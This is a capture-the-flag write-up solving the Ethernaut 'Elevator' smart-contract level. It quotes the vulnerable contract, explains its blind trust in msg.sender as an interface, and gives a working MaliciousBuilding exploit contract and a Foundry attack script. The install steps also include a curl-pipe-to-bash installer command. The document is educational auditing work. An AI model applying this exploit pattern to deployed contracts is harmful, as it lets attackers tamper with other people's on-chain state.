# Ethernaut Level: Elevator - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Elevator** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/elevator/`) contains everything related to it.

**Goal:** Set the `top` variable to `true` by exploiting the `goTo` function.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 25, 2025 (Day 12).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract simulates an elevator that relies on an external `Building` interface to determine if a floor is the top. The `goTo` function trusts the caller as the Building, allowing state manipulation through interface abuse.

**Key Code Snippet (from src/Elevator.sol):**
```solidity
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);  // Vulnerable: Trusts msg.sender as Building!

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);  // Second call in same interface
        }
    }
}
```

## Vulnerability Analysis
**Main Issue: Blind Trust in External Interface (Caller as Building)**  
- The `goTo` function casts `msg.sender` to the `Building` interface without verification, allowing any contract to implement `isLastFloor` maliciously.  
- **Security Impact:** An attacker can return `false` on the first call (to set the floor) and `true` on the second (to set `top = true`), bypassing the logic. This exploits interface polymorphism without access controls.  
- **Audit Tip:** Never trust external interfaces without validation (e.g., whitelisting or signatures). Use tools like Slither to detect unsafe casts (`slither . --detect interface-trust`).

**Example:** Caller contract returns `false` for first `isLastFloor(1)` (floor set), then `true` for second `isLastFloor(floor)` (top set).

## Solution Steps
The attack: Deploy a malicious `Building` contract that alternates `isLastFloor` returns using state, then call `goTo` to manipulate `top`.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/ElevatorSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `top()` returns `true`, submit on Ethernaut site.

**Key Attack Code Snippet (from src/MaliciousBuilding.sol and script/ElevatorSolution.s.sol):**
```solidity
// Malicious Building (src/MaliciousBuilding.sol)
contract MaliciousBuilding is Building {
    bool public calledOnce = false;
    Elevator public elevator;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (calledOnce) {
            calledOnce = false;
            return true;  // Second call: Set top = true
        } else {
            calledOnce = true;
            return false;  // First call: Allow floor set
        }
    }

    function attack() external {
        elevator.goTo(1);  // Trigger exploit
    }
}

// Script Excerpt (script/ElevatorSolution.s.sol)
MaliciousBuilding malicious = new MaliciousBuilding(elevatorInstance);
malicious.attack();
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates alternate returns and top set.
- **Testnet Output Example:** Console log: "Before attack, Top: false", "After attack, Top: true".

## Key Learnings
- **Auditing Skill:** Validate external calls and interfaces—simulate with malicious implementations in Foundry.
- **EVM Concept:** Interface casting assumes correct implementation; abuse via custom contracts.
- **Prevention:** Whitelist trusted addresses or use static calls; avoid dynamic interfaces.
- **Next Step:** Extend script to test multiple floors or add revert simulation.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/elevator`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/ElevatorSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Privacy. 🚀

---

**License:** MIT  
**Author:** [0xZHD] - Smart Contract Auditor Learner  
**X:** [Zahedul I Sadik](@0xZHD_X)  
**References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)